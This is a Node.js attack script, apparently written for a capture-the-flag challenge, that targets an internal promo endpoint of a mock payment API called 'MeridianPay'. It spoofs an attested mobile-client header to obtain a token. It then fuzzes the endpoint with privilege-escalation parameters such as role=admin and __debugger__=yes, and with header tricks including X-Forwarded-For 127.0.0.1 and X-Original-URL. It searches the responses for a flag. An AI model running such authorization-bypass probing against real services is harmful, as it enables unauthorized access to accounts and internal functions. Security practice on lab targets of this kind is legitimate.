const https = require("https");
const base = "https://web-f747413d78eddd9f.web.h7tex.com";
const client = "MeridianPay-Android/3.2.1 (attested)";

function request(path, headers = {}) {
  return new Promise((resolve) => {
    const req = https.request(base + path, { headers }, (res) => {
      let body = ""; res.on("data", (chunk) => body += chunk); res.on("end", () => resolve({ status: res.statusCode, body, headers: res.headers }));
    });
    req.on("error", (error) => resolve({ status: "error", body: error.message })); req.end();
  });
}

(async () => {
  const body = JSON.stringify({ device_id: "parameter-probe" });
  const auth = await new Promise((resolve, reject) => {
    const req = https.request(base + "/api/v1/auth/device", { method: "POST", headers: { "X-Meridian-Client": client, "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) } }, (res) => {
      let data = ""; res.on("data", (chunk) => data += chunk); res.on("end", () => resolve(JSON.parse(data)));
    }); req.on("error", reject); req.end(body);
  });
  const baseline = await request("/api/v1/internal/promo", { "X-Meridian-Client": client, Authorization: `Bearer ${auth.token}` });
  const parameters = [
    "id=1", "id=1001", "id=0", "id=1002", "user_id=1", "user_id=1001", "user_id=admin", "sub=admin", "member=admin", "member_id=1001", "account=admin", "role=admin", "tier=premium", "internal=1", "admin=true", "debug=true", "format=json", "view=admin", "promo=admin", "enrolled=true", "loyalty_enrolled=true", "flag=1", "include=flag", "fields=flag", "profile=admin", "device_id=admin", "token=admin", "callback=flag", "next=/admin", "path=/admin", "url=/admin", "redirect=/admin", "__debugger__=yes", "__class__=admin",
  ];
  const headerSets = [
    {}, { "X-User-Id": "1" }, { "X-User-Id": "admin" }, { "X-Role": "admin" }, { "X-Forwarded-User": "admin" }, { "X-Forwarded-For": "127.0.0.1" }, { "X-Original-URL": "/api/v1/admin/flag" }, { "X-Rewrite-URL": "/api/v1/admin/flag" }, { "X-Debug": "true" }, { "X-Internal": "true" },
  ];
  for (const parameter of parameters) {
    const response = await request(`/api/v1/internal/promo?${parameter}`, { "X-Meridian-Client": client, Authorization: `Bearer ${auth.token}` });
    if (response.status !== baseline.status || response.body !== baseline.body) console.log("QUERY", parameter, JSON.stringify(response));
  }
  for (const extra of headerSets) {
    const response = await request("/api/v1/internal/promo", { "X-Meridian-Client": client, Authorization: `Bearer ${auth.token}`, ...extra });
    if (response.status !== baseline.status || response.body !== baseline.body) console.log("HEADER", JSON.stringify(extra), JSON.stringify(response));
  }
  console.log("completed; baseline:", baseline.body.match(/H7CTF\{[^}]+\}/)?.[0]);
})().catch((error) => { console.error(error); process.exitCode = 1; });
